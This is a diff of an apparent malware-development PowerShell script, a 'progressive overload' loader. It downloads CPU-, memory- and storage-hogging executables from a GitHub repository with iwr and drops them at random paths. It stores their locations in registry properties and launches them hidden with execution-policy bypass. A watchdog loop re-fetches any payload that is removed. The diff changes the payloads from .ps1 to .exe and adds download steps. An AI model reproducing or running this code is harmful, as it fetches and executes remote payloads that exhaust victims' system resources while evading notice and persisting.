@@ -2,7 +2,7 @@ param( [string]$basePath )
 
 $cpuHogUri = "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/cpu_hog.exe"
 $memHogUri = "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/mem_hog.exe"
-$storageHogUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/storage_hog.ps1"
+$storageHogUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/storage_hog.exe"
 $memPropertyName = "mem"
 $storagePropertyName = "store"
 echo $basePath >> "C:\Users\maldev\Downloads\root.txt"
@@ -46,8 +46,9 @@ $itemMem = Get-ItemProperty -Path "$basePath" -Name $memPropertyName -ErrorActio
 if(-not($itemMem)){
     $idx = Get-Random -Minimum 0 -Maximum $paths.Length
     $memHogPath = $paths[$idx]
-    $memHogPath = "$memHogPath\mem_hog.ps1"
+    $memHogPath = "$memHogPath\mem_hog.exe"
     New-ItemProperty -Path "$basePath" -Name $memPropertyName -Value $memHogPath -Force | Out-Null
+    iwr -Uri $memHogUri -OutFile $memHogPath
 }else { $memHogPath = $itemMem.$memPropertyName }
 
 # $itemStore = Get-ItemProperty -Path "$basePath" -Name $storagePropertyName -ErrorAction SilentlyContinue
@@ -55,8 +56,9 @@ if(-not($itemMem)){
 # if(-not($itemStore)){
 #     $idx = Get-Random -Minimum 0 -Maximum $paths.Length
 #     $storageHogPath = $paths[$idx]
-#     $storageHogPath = "$storageHogPath\storage_hog.ps1"
+#     $storageHogPath = "$storageHogPath\storage_hog.exe"
 #     New-ItemProperty -Path "$basePath" -Name $storagePropertyName -Value $storageHogPath -Force | Out-Null
+#     iwr -Uri $storageHogUri -OutFile $storageHogPath
 # }else { $storageHogPath = $itemStore.$storagePropertyName }
 
 $threshold = Get-Random -Minimum 80 -Maximum 86
@@ -143,7 +145,7 @@ while ($true) {
 
     if(-not(Test-Path $memHogPath -PathType Leaf)){
         $memHogPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
-        $memHogPath = "$memHogPath\mem_hog.ps1"
+        $memHogPath = "$memHogPath\mem_hog.exe"
         iwr -Uri $memHogUri -OutFile $memHogPath
         $memTaskRunAction = "-ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$memHogPath'"
         Set-ItemProperty -Path "$basePath" -Name $memPropertyName -Value $memHogPath -Force | Out-Null
@@ -152,7 +154,7 @@ while ($true) {
     # if(-not(Test-Path $storageHogPath -PathType Leaf)){
     #     schtasks /end /tn $storageHogTaskName
     #     $storageHogPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
-    #     $storageHogPath = "$storageHogPath\storage_hog.ps1"
+    #     $storageHogPath = "$storageHogPath\storage_hog.exe"
     #     iwr -Uri $storageHogUri -OutFile $storageHogPath
     #     $storageTaskRunAction = "powershell -ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden '$storageHogPath'"
     #     Set-ItemProperty -Path "$basePath" -Name $storagePropertyName -Value $storageHogPath -Force | Out-Null
@@ -165,7 +167,7 @@ while ($true) {
     $curr = Get-RamPercentage
     if($curr -ge $threshold){
         echo "threshold $threshold reached at $curr" >> "C:\thres.txt"
-        $cpuHogPath = "$($paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)])\cpu_hog.ps1"
+        $cpuHogPath = "$($paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)])\cpu_hog.exe"
         iwr -Uri $cpuHogUri -OutFile $cpuHogPath
         powershell.exe -ep bypass -w hidden -noP $cpuHogPath
     }
